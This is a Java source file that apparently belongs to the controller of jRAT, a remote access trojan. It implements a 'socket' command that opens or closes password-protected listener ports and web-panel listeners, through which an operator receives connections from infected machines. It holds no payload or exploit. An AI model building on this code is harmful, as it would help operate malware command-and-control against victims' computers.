package io.jrat.controller.commands;

import io.jrat.controller.Main;
import io.jrat.controller.net.PortListener;
import io.jrat.controller.net.ServerListener;
import io.jrat.controller.webpanel.WebPanelListener;

import java.io.PrintStream;

import jrat.api.commands.AbstractCommand;

public class CommandSocket extends AbstractCommand {

	@Override
	public String getDescription() {
		return "Adds, removes or modifies already existing socket";
	}

	@Override
	public String getExample() {
		return "socket add 9999 1234 --web --timeout 15";
	}

	@Override
	public String getUsage() {
		return "socket {add|remove} [name] <port> <password> <--web> <--timeout [timeout]>";
	}

	@Override
	public void process(String[] args, PrintStream ps) throws Exception {
		if (args.length < 2) {
			System.err.println("Usage: " + getUsage());
			return;
		}

		String action = args[0];
		String name = args[1];

		if (action.equalsIgnoreCase("add")) {
			int port = Integer.parseInt(args[2]);
			String pass = args[3];
			boolean web = false;
			int timeout = 15000;
			
			if (Main.argsContains(args, "--web")) {
				web = true;
			}
			
			if (Main.argsContains(args, "--timeout")) {
				timeout = Integer.parseInt(Main.getArg(args, "--timeout"));
			}
			
			PortListener connection = null;
			
			if (web) {
				connection = new WebPanelListener(name, port, pass);
			} else {
				connection = new ServerListener(name, port, timeout, pass);
			}
			
			connection.start();
			
			System.out.println("Socket " + name + " added");
		} else if (action.equalsIgnoreCase("remove")) {
			PortListener con = PortListener.getListener(name);
			con.getServer().close();
			PortListener.listeners.remove(con);
			
			System.out.println("Socket closed");
		} else {
			System.err.println("Invalid option " + action);
		}
	}

}